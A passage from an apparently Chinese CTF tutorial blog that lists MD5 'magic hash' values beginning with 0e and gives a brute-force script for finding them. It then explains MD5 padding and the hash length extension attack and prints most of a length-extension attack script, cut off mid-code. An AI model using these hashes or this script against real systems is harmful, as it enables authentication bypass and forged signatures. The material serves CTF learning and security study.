0e224441551631909369101555335043</span><br><span class="line">0e00540451811 0e057099852684304412663796608095</span><br><span class="line">0e00678205148 0e934049274119262631743072394111</span><br><span class="line">0e00741250258 0e899567782965109269932883593603</span><br><span class="line">0e00928251504 0e148856674729228041723861799600</span><br><span class="line">0e01350016114 0e769018222125751782256460324867</span><br><span class="line">0e01352028862 0e388419153010508575572061606161</span><br><span class="line">0e01392313004 0e793314107039222217518920037885</span><br><span class="line">0e01875552079 0e780449305367629893512581736357</span><br><span class="line">0e01975903983 0e317084484960342086618161584202</span><br><span class="line">0e02042356163 0e335912055437180460060141819624</span><br><span class="line">0e02218562930 0e151492820470888772364059321579</span><br><span class="line">0e02451355147 0e866503534356013079241759641492</span><br><span class="line">0e02739970294 0e894318228115677783240047043017</span><br><span class="line">0e02760920150 0e413159393756646578537635311046</span><br><span class="line">0e02784726287 0e433955189140949269100965859496</span><br><span class="line">0e03298616350 0e851613188370453906408258609284</span><br><span class="line">0e03393034171 0e077847024281996293485700020358</span><br></pre></td></tr></table></figure><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">payload = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcMd5</span>(<span class="params">s</span>):</span><br><span class="line">    MD5 = hashlib.md5(s).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> MD5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&quot;0e&quot;</span> <span class="keyword">and</span> MD5[<span class="number">2</span>:<span class="number">32</span>].isdigit():</span><br><span class="line">        <span class="built_in">print</span> s,MD5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getStr</span>(<span class="params">payload,s,slen</span>):</span><br><span class="line">    <span class="comment">#print &#x27;.&#x27;,</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) == slen:</span><br><span class="line">        <span class="comment">#Custom string</span></span><br><span class="line">        calcMd5(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">        sl= s+payload[j]</span><br><span class="line">        getStr(payload,sl,slen)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getStr(payload,<span class="string">&#x27;0e&#x27;</span>,<span class="number">13</span>)</span><br></pre></td></tr></table></figure><p><strong>MD5和双MD5都是<code>0e</code>开头的：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure><h2 id="哈希长度扩展攻击"><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>哈希长度扩展攻击，简单的说就是由于hash的生成机制使得我们可以人为的在原先明文基础上添加新的拓展字符，从而使得原本的加密链变长，进一步控制加密链的最后一节，使得我们得以控制最终的结果。</p><p>为了更好的解释该原理，下面以MD5算法举个例子</p><h3 id="MD5加密"><a href="#MD5加密" class="headerlink" title="MD5加密"></a>MD5加密</h3><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p>MD5算法是典型的一种信息摘要算法，它是由md2、md3和md4演变而来的。无论是哪一种的md算法都是将一个<strong>任意长度</strong>的字符串加密为一串<strong>固定长度的密文</strong>。在这整个加密过程中，会将明文字符串转换为一个<strong>128位</strong>的消息摘要，接直把消息摘要转换为一个<strong>十六进制的字符串就会得到32位的字符串</strong>，也就是我们平时见到的MD5密文</p><blockquote><p><strong>因为MD5加密过程经过了压缩，加密和hash算法，所以MD5加密的内容是不可逆的</strong></p></blockquote><h4 id="MD5算法过程"><a href="#MD5算法过程" class="headerlink" title="MD5算法过程"></a>MD5算法过程</h4><p>要了解算法的原理过程，肯定需要一个流程图便于理解：</p><p><img src="/archives/af00d924/20180813125243-b731fe76-9eb4-1.png"></p><p>大致步骤为：</p><ol><li>把消息分为n个分组</li><li>对最后一个消息分组进行填充</li><li>和输入量进行运算，运算结果位下一个分组的输入量</li><li>输出最终结果</li></ol><p>下面举个例子好理解一点：</p><p>比如我们需要对<code>1234567890123456</code>进行加密,首先我们需要将它转化为二进制，即：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#转换结果 00110001 00110010 00110011 00110100 00110101 00110110 00110111 00111000 00111001 00110000 00110001 00110010 00110011 00110100 00110101 00110110</span></span><br></pre></td></tr></table></figure><p>因为一个ASCIl码对应8位二进制字符，所以我们得到了128位二进制字符，下面我们在winhex（需要转为十六进制）上观察：</p><p><img src="/archives/af00d924/QQ%E6%88%AA%E5%9B%BE20240814145527.png"></p><p>对于MD5算法来说，我们需要将原数据进行分块处理，以512位个二进制数据为一块，而最后一块的处理分为以下两种情况：</p><ul><li><strong>明文数据的二进制数据长度&lt;&#x3D;448，通过填充padding（无意义占位）数据使其长度为448，再添加原始明文数据的二进制长度信息（64）使其长度为512位即可。</strong></li><li><strong>明文数据的二进制数据长度大于448但小于等于512，填充padding数据至下一块的448位，而后再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</strong></li></ul><p><strong>对于padding数据（长度不定）来说：首位二进制位1，其余位为0.</strong></p><p>对于我们的数据只有128位二进制字符，所以我们需要填充到448位，又因为**10000000(2)&#x3D;80(16),**补充上去即可：</p><p><img src="/archives/af00d924/"><img src="/archives/af00d924/QQ%E6%88%AA%E5%9B%BE20240814152802.png" alt="QQ截图20240814152802"></p><p><strong>对于长度信息位（长度8Byte&#x3D;64bit)来说，我们还需补位8byte,从低位走向高位，原始明文为<code>1234567890123456</code>共16byte，有16*8&#x3D;128bit,转换为十六进制为80，写入倒数第八个byte位，之后补7byte的0x00：</strong></p><p><img src="/archives/af00d924/QQ%E6%88%AA%E5%9B%BE20240814154837.png"></p><p>接下来需要用这64byte的数据进行计算，与初始向量进行计算</p><p>计算信息的摘要需要用补位结果的数据进行运算，也就是补位后的512bit的消息，在计算时候有个初始的向量，这里初始的向量是一个固定的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A 01 23 45 67 0x67452301</span><br><span class="line">B 89 AB CD EF 0xEFCDAB89</span><br><span class="line">C FE DC BA 98 0x98BADCFE</span><br><span class="line">D 76 54 32 10 0x10325476</span><br></pre></td></tr></table></figure><p>由于在计算机存储中采用的是小端存储方式，所以上面初始化向量在程序中的初始化代码为后面的0x部分。</p><p>然后将刚才的<strong>512bit消息和初始化向量</strong>进行第一轮的运算，之后初始化向量会被新的值覆盖，最后一轮的向量经过高低位互换后就是计算出的MD5值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">高低位互换：</span><br><span class="line">    abcdef-&gt;fedcba</span><br></pre></td></tr></table></figure><p>高低位互换的过程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">假如最后一轮的运算后的向量值为：</span><br><span class="line">    A=0xabcdef12</span><br><span class="line">    B=0xabcdef12</span><br><span class="line">    C=0xabcdef12</span><br><span class="line">    D=0xabcdef12</span><br><span class="line">那么进行高低位互换之后得到的数值为：</span><br><span class="line">12 ef cd ab</span><br><span class="line">12 ef cd ab</span><br><span class="line">12 ef cd ab</span><br><span class="line">12 ef cd ab</span><br></pre></td></tr></table></figure><p>进行拼接得到最后加密结果<br><code>12efcdab12efcdab12efcdab12efcdab</code></p><h3 id="攻击工具"><a href="#攻击工具" class="headerlink" title="攻击工具"></a>攻击工具</h3><p>上面我们也了解到了MD5的加密过程，而我们只要知道一个hash值，知道原来数据的数据长度，那么我们就可以算出<br><code>原数据+填充数据到512+任意内容</code>的hash值。</p><p>而有些ctf就是需要我们找填充的数据及填充后的hash值，当然我们不可能手搓，下面是关于该攻击的一个脚本</p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: King kaki</span></span><br><span class="line"><span class="comment"># @Date:   2018-08-04 12:40:11</span></span><br><span class="line"><span class="comment"># @Last Modified by:   kingkk</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2018-08-12 15:08:28</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">F = <span class="keyword">lambda</span> x, y, z: ((x &amp; y) | ((~x) &amp; z))</span><br><span class="line">G = <span class="keyword">lambda</span> x, y, z: ((x &amp; z) | (y &amp; (~z)))</span><br><span class="line">H = <span class="keyword">lambda</span> x, y, z: (x ^ y ^ z)</span><br><span class="line">I = <span class="keyword">lambda</span> x, y, z: (y ^ (x | (~z)))</span><br><span class="line">L = <span class="keyword">lambda</span> x, n: (((x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n))) &amp; (<span class="number">0xffffffff</span>))</span><br><span class="line">shi_1 = (<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>) * <span class="number">4</span></span><br><span class="line">shi_2 = (<span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>) * <span class="number">4</span></span><br><span class="line">shi_3 = (<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>) * <span class="number">4</span></span><br><span class="line">shi_4 = (<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>) * <span class="number">4</span></span><br><span class="line">m_1 = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>)</span><br><span class="line">m_2 = (<span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>)</span><br><span class="line">m_3 = (<span class="number">5</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">2</span>)</span><br><span class="line">m_4 = (<span class="number">0</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(<span class="number">4294967296</span> * <span class="built_in">abs</span>(math.sin(i)))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">shift_list</span>):</span><br><span class="line">    shift_list = [shift_list[<span class="number">3</span>], shift_list[<span class="number">0</span>], shift_list[<span class="number">1</span>], shift_list[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> shift_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">fun_list, f, m, shi</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">global</span> Ti_count</span><br><span class="line">    <span class="keyword">while</span> count &lt; <span class="number">16</span>:</span><br><span class="line">        xx = <span class="built_in">int</span>(fun_list[<span class="number">0</span>], <span class="number">16</span>) + f(<span class="built_in">int</span>(fun_list[<span class="number">1</span>], <span class="number">16</span>), <span class="built_in">int</span>(fun_list[<span class="number">2</span>], <span class="number">16</span>), <span class="built_in">int</span>(fun_list[<span class="number">3</span>], <span class="number">16</span>)) + <span class="built_in">int</span>(m[count], <span class="number">16</span>) + T(Ti_count)</span><br><span class="line">        xx &amp;= <span class="number">0xffffffff</span></span><br><span class="line">        ll = L(xx, shi[count])</span><br><span class="line">        fun_list[<span class="number">0</span>] = <span class="built_in">hex</span>((<span class="built_in">int</span>(fun_list[<span class="number">1</span>], <span class="number">16</span>) + ll) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        fun_list = shift(fun_list)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        Ti_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> fun_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_m16</span>(<span class="params">order, ascii_list, f_offset</span>):</span><br><span class="line">    ii = <span class="number">0</span></span><br><span class="line">    m16 = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    f_offset *= <span class="number">64</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">        i *= <span class="number">4</span></span><br><span class="line">        m16[ii] = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join((ascii_list[i + f_offset] + ascii_list[i + <span class="number">1</span> + f_offset] + ascii_list[i + <span class="number">2</span> + f_offset] + ascii_list[i + <span class="number">3</span> + f_offset]).split(<span class="string">&#x27;0x&#x27;</span>))</span><br><span class="line">        ii += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m16)):</span><br><span class="line">        m16[ind] = reverse_hex(m16[ind])</span><br><span class="line">    <span class="keyword">return</span> m16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex</span>(<span class="params">hex_str</span>):</span><br><span class="line">    hex_str = hex_str[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) &lt; <span class="number">8</span>:</span><br><span class="line">        hex_str = <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(hex_str)) + hex_str</span><br><span class="line">    hex_str_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>):</span><br><span class="line">        hex_str_list.append(hex_str[i:i + <span class="number">2</span>])</span><br><span class="line">    hex_str_list.reverse()</span><br><span class="line">    hex_str_result = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(hex_str_list)</span><br><span class="line">    <span class="keyword">return</span> hex_str_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_result</span>(<span class="params">f_list</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    f_list1 = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f_list:</span><br><span class="line">        f_list1[f_list.index(i)] = reverse_hex(i)[<span class="number">2</span>:]</span><br><span class="line">        result += f_list1[f_list.index(i)]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">input_m, msg_lenth=<span class="number">0</span></span>):</span><br><span class="line">    ascii_list = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>, <span class="built_in">map</span>(<span class="built_in">ord</span>, input_m)))</span><br><span class="line">    msg_lenth += <span class="built_in">len</span>(ascii_list) * <span class="number">8</span></span><br><span class="line">    ascii_list.append(<span class="string">&#x27;0x80&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ascii_list)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ascii_list[i]) &lt; <span class="number">4</span>:</span><br><span class="line">            ascii_list[i] = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;0&#x27;</span> + ascii_list[i][<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">len</span>(ascii_list) * <span class="number">8</span> + <span class="number">64</span>) % <span class="number">512</span> != <span class="number">0</span>:</span><br><span class="line">        ascii_list.append(<span class="string">&#x27;0x00&#x27;</span>)</span><br><span class="line">    msg_lenth_0x = <span class="built_in">hex</span>(msg_lenth)[<span class="number">2</span>:]</span><br><span class="line">    msg_lenth_0x = <span class="string">&#x27;0x&#x27;</span> + msg_lenth_0x.rjust(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    msg_lenth_0x_big_order = reverse_hex(msg_lenth_0x)[<span class="number">2</span>:]</span><br><span class="line">    msg_lenth_0x_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_lenth_0x_big_order), <span class="number">2</span>):</span><br><span class="line">        msg_lenth_0x_list.append(<span class="string">&#x27;0x&#x27;</span> + msg_lenth_0x_big_order[i: i + <span class="number">2</span>])</span><br><span class="line">    ascii_list.extend(msg_lenth_0x_list)</span><br><span class="line">    <span class="keyword">return</span> ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">input_m</span>):</span><br><span class="line">    <span class="keyword">global</span> Ti_count</span><br><span class="line">    Ti_count = <span class="number">1</span></span><br><span class="line">    abcd_list = [<span class="string">&#x27;0x67452301&#x27;</span>, <span class="string">&#x27;0xefcdab89&#x27;</span>, <span class="string">&#x27;0x98badcfe&#x27;</span>, <span class="string">&#x27;0x10325476&#x27;</span>]</span><br><span class="line">    ascii_list = padding(input_m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ascii_list) // <span class="number">64</span>):</span><br><span class="line">        aa, bb, cc, dd = abcd_list</span><br><span class="line">        order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">        order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">        order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">        order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">        abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">        abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">        abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">        abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">        output_a = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + <span class="built_in">int</span>(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_b = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + <span class="built_in">int</span>(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_c = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + <span class="built_in">int</span>(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_d = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + <span class="built_in">int</span>(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">        Ti_count = <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(ascii_list)</span><br><span class="line">    <span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># md5-Length Extension Attack: 计算 md5(message + padding + suffix), res = md5(message), len_m = len(message)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_lea</span>(<span class="params">suffix, res, len_m</span>):</span><br><span class="line">    <span class="keyword">global</span> Ti_count</span><br><span class="line">    Ti_count = <span class="number">1</span></span><br><span class="line">    abcd_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>):</span><br><span class="line">        abcd_list.append(reverse_hex(<span class="string">&#x27;0x&#x27;</span> + res[i: i + <span class="number">8</span>]))</span><br><span class="line">    <span class="comment"># print(abcd_list)</span></span><br><span class="line">    ascii_list = padding(suffix, (len_m + <span class="number">72</span>) // <span class="number">64</span> * <span class="number">64</span> * <span class="number">8</span>)  <span class="comment"># len(message + padding) * 8</span></span><br><span class="line">    <span class="comment"># print(ascii_list)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ascii_list) // <span class="number">64</span>):</span><br><span class="line">        aa, bb, cc, dd = abcd_list</span><br><span class="line">        order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">        order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">        order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">        order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">        abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">        abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">        abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">        abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">        output_a = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + <span class="built_in">int</span>(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_b = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + <span class="built_in">int</span>(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_c = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + <span class="built_in">int</span>(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_d = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + <span class="built_in">int</span>(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">        Ti_count = <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(ascii_list)</span></span><br><span class="line">    <span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_append</span>(<span class="params">hex_bit</span>):</span><br><span class="line">    len_append = <span class="string">&#x27;0x&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>( (<span class="number">18</span>-<span class="built_in">len</span>(hex_bit))*<span class="string">&#x27;0&#x27;</span>, hex_bit[<span class="number">2</span>:])</span><br><span class="line">    len_append = reverse_hex(len_append)[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(len_append)</span></span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(len_append)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> ==<span class="number">0</span> :</span><br><span class="line">            t += <span class="string">&#x27;%&#x27;</span>+len_append[i:i+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span 